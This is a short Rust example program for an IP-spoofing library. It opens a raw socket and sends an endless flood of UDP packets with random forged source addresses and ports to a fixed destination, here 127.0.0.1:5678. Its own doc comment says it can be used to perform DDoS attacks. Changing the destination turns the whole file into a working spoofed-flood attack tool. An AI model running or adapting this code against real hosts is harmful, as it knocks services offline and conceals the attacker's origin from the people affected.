use ip_spoofing::{self, rand::*, RawSocket, ReusablePacketWriter};

/// This example shows how to generate bunch of fake UDP packets.
/// It can be used to perform DDoS attacks.
///
/// In this case it will spam UDP packets to `127.0.0.1:5678`
fn main() -> ip_spoofing::Result<()> {
    //wrapper around raw sockets, requires root privileges
    let socket = RawSocket::new()?;

    //wrapper for writing packets in pre-allocated memory
    let mut writer = ReusablePacketWriter::new();
    //thread-local pseudorandom number generator
    let mut rng = thread_rng();

    //endless spam with a randomly generated UDP packet
    loop {
        let ret = socket.send_fake_udp_packet(
            &mut writer,
            rng.gen(),      //random source IPv4 address
            rng.gen(),      //random source port
            [127, 0, 0, 1], //destination IPv4 address
            5678,           //destination port
            b"hey",         //data
            64,             //TTL on most Linux machines is 64
        );

        if let Err(err) = ret {
            println!("{err:?}");
        }
    }
}
